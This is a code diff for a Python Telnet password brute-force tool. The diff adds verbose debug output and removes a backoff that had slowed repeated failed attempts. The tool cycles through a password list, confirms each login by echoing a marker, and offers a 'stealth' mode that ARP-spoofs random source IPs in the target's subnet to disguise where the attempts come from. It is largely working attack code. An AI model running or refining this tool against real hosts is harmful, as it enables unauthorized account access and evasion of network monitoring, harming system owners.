@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# Telnet Brute Force
+# Telnet Brute Force Tool with Debug Logging
 
 import argparse
 import threading
@@ -17,10 +17,10 @@ GREEN  = "\033[38;2;0;255;0m"
 RESET  = "\033[0m"
 BOLD   = "\033[1m"
 
-stopEvent     = threading.Event()
-stdoutLock    = threading.Lock()
-attemptsDone  = 0
-startTime     = 0
+stopEvent    = threading.Event()
+stdoutLock   = threading.Lock()
+attemptsDone = 0
+startTime    = 0
 
 def SignalHandler(sig, frame):
     print(f"\n{RED}Stopping brute force...{RESET}")
@@ -40,7 +40,6 @@ def PrintProgress(total):
         time.sleep(1)
 
 def AttemptLogin(host, port, username, password, sourceIp=None):
-    """Returns True only if marker echo is received."""
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     if sourceIp:
         try:
@@ -57,17 +56,19 @@ def AttemptLogin(host, port, username, password, sourceIp=None):
         tn.read_until(b"Password: ", timeout=3)
         tn.write(password.encode() + b"\n")
 
-        # Give server a moment, then send marker
-        time.sleep(1)
+        time.sleep(2)
         tn.write(b"echo __BRUTE_OK__\n")
-        time.sleep(0.5)
+        time.sleep(1)
 
         out = tn.read_very_eager().decode(errors="ignore")
         tn.close()
 
+        print(f"{RED}DEBUG OUTPUT for '{password}':\n{out}{RESET}")
+
         return "__BRUTE_OK__" in out
 
-    except Exception:
+    except Exception as e:
+        print(f"{RED}DEBUG Exception for '{password}': {e}{RESET}")
         return False
     finally:
         sock.close()
@@ -78,30 +79,36 @@ def ArpSpoofOnce(targetIp, fakeIp, iface):
 
 def WorkerNormal(host, port, username, passwords, delay):
     global attemptsDone
-    failCount = 0
+    print("DEBUG: WorkerNormal starting")
     for pwd in passwords:
         if stopEvent.is_set():
+            print("DEBUG: WorkerNormal detected stopEvent, exiting")
             break
-        if AttemptLogin(host, port, username, pwd):
+        print(f"DEBUG: attempting '{pwd}'")
+        ok = AttemptLogin(host, port, username, pwd)
+        print(f"DEBUG: AttemptLogin returned {ok}")
+        if ok:
+            print(f"\n{GREEN}Success: {username}:{pwd}{RESET}")
             stopEvent.set()
             break
         with stdoutLock:
             attemptsDone += 1
-        failCount += 1
         time.sleep(delay)
-        if failCount >= 5:
-            time.sleep(delay * 10)
-            delay = min(delay * 2, 30)
-            failCount = 0
 
 def WorkerStealth(host, port, username, passwords, subnetPrefix, iface, delay):
     global attemptsDone
+    print("DEBUG: WorkerStealth starting")
     for pwd in passwords:
         if stopEvent.is_set():
+            print("DEBUG: WorkerStealth detected stopEvent, exiting")
             break
         fakeIp = f"{subnetPrefix}.{random.randint(2,254)}"
+        print(f"DEBUG: ARP spoofing {fakeIp}")
         ArpSpoofOnce(host, fakeIp, iface)
-        if AttemptLogin(host, port, username, pwd, sourceIp=fakeIp):
+        ok = AttemptLogin(host, port, username, pwd, sourceIp=fakeIp)
+        print(f"DEBUG: AttemptLogin returned {ok}")
+        if ok:
+            print(f"\n{GREEN}Success: {username}:{pwd}{RESET}")
             stopEvent.set()
             break
         with stdoutLock:
@@ -110,15 +117,14 @@ def WorkerStealth(host, port, username, passwords, subnetPrefix, iface, delay):
 
 def StartAttack(host, port, username, passwords, mode, subnetPrefix, iface, threadsCount, delay):
     global startTime, attemptsDone
+    stopEvent.clear()
     startTime = time.time()
     attemptsDone = 0
     total = len(passwords)
 
-    # start progress printer
     prog = threading.Thread(target=PrintProgress, args=(total,), daemon=True)
     prog.start()
 
-    # split work
     slices = [passwords[i::threadsCount] for i in range(threadsCount)]
     threads = []
     for i in range(threadsCount):
